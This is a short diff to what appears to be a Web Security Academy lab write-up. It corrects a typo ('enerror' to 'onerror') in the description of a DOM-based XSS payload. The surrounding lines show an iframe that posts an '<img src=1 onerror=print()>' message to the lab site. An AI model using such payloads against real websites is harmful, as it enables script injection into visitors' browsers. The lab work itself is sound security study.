@@ -12,7 +12,7 @@
     })
 </script>
 ```
-* Payload - By adding a wrong `src` and `enerror=` function will cause `print()`
+* Payload - By adding a wrong `src` and `onerror=` function will cause `print()`
 ```html
 <iframe src="https://ac7e1f1c1f3ed2d1c06281a0005800be.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
 ```
